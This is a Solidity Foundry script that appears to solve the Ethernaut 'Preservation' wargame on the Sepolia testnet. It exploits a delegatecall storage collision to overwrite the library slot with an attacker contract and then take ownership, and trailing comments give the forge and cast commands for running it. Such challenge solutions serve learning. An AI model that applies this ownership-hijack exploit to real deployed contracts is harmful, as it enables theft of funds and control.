// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// Preservation  contract address: "0xc171bDF00440715CDd46CB505a941e05111E11A0"

interface IPreservation {
    function timeZone1Library() external returns (address);

    function timeZone2Library() external returns (address);

    function owner() external returns (address);

    function setFirstTime(uint256) external;

    function setSecondTime(uint256) external;
}

interface ILibraryContract {
    function setTime(uint) external;
}

contract TriggerAttack is Script {
    IPreservation public preservation;
    ILibraryContract public libraryContract;

    address preservationAddr = 0x95fE6cD330fC289D52B9bf7FD14ad050Dc24Ca4E;
    address libraryContractAddr = 0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30; //timeZone1Library()
    address attackAddr = 0x2cEA95F045f95e8Db6185044bb0F06595FCFCE13;
    address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        // Create an instance of preservation contract
        vm.startBroadcast(privateKey);
        preservation = IPreservation(preservationAddr);
        vm.stopBroadcast();

        // Create an instance of Library contract
        vm.startBroadcast(privateKey);
        libraryContract = ILibraryContract(libraryContractAddr);
        vm.stopBroadcast();

        // Using the publicly visible function in the Library contract or setFirstTime,
        // we can change slot0 of the Library contract
        // Which changes the slot 0 of the contract and that of preservation

        vm.startBroadcast(privateKey);
        // libraryContract.setTime(uint256(uint160(attackAddr))); // this
        preservation.setFirstTime(uint256(uint160(attackAddr))); // or This
        preservation.setFirstTime(uint256(uint160(player)));
        vm.stopBroadcast();
    }
}
// */
// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
// cast storage 0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30 0 --rpc-url $SEPOLIA_RPC_URL

// cast --to-ascii 0x0000000000000000000000002cea95f045f95e8db6185044bb0f06595fcfce13
